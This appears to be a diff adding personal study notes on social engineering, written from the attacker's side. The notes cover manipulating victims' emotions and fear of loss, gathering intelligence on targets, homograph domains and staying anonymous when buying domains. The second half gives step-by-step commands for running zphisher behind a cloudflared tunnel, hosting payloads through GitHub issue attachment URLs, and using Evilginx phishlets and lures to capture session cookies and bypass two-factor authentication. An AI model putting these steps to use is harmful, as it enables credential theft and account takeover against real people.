@@ -1,0 +1,69 @@
+Sociology
+  norms:
+    rules and expectations for victim
+  values:
+    values the victim have
+  role:
+    norms depends on norms, norms for a dr isn't the same
+  culture:
+    social engineering in lebanon can be different from one in the usa
+  social structure of the victim
+
+dopamine and oxytocin // try to let his happy emotions disable his critical thinking
+
+Decision making:
+  fear of loss
+    such as a junior who is trying to proof himeself would do his job directly after he gets the email due to fear of loss
+
+OSINT/INTL | Continued
+data -> information -> knowledge
+  I gather data
+  information like what priveledge do this user have....
+  after info I plan which person is suitable for the attack so I do my decision making
+  then I look for tools, how to do the attack
+
+attack types:
+  smishing // phishing through text message
+  vishing // voice phishing / phone number spoofing
+  phishing // stealing sensitive data, downloading a virus, ransomware
+  deception and impersonation // trust me I am recruiter from company x
+  .....
+
+homograph attack, twitter.com // have different w encoding which have same character
+  when buying a domain a black hat hacker should use tore, use free visa not with his name, and other things to make himeself anonymous
+
+tool:
+  zphisher
+  cd zphisher
+  ./zphisher.sh
+  run it locally
+  cloudflared tunnle --url http://localhost:8080
+    browser and cloudflare will know it is a phishing site and warn the user
+      so I can buy a domain or get a domain for free
+        register.it
+
+on github you can try submitting an issue and then put a file the user can download, you don't need to submit it, just benifit from the url you will be getting
+
+  Evilginx: // more powerful, can bypass 2fa as well
+  setup:
+    localStorage manager
+      Cookie Editor and Storage Manager
+    edit this cookie (fork)
+    fork evilginx2
+      run: build_run.bat
+
+
+phishlet:
+  cookie_name // user_session, token 1
+  help phishlets
+  sudo /usr/local/go/bin/go run main.go -p ./phishlets
+  phishlets enable example
+  phishlets enable example
+  config domain yourdomain.com
+  phishlets hostname example sub.yourdomain.com
+  lures create example
+  lures get-url 0
+  after the user logs in
+    sessions // check sessions
+    help sessions
+    details 10
